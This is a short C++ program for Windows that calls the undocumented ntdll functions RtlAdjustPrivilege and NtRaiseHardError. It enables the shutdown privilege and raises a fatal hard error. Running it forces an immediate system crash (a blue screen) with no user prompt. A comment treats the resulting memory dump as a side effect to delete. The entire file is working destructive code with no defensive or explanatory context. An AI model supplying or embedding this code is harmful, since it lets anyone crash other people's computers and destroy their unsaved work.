#include <Windows.h>
#include <winternl.h>

using namespace std; 

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);

/* Calling a Hard Error creates a snapshot of your memory, in %SystemRoot% with the name 'memory.dmp' (this file can take up tons of space, I'd advise to delete it after) */
extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);


int main()
{
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    return 0;
}
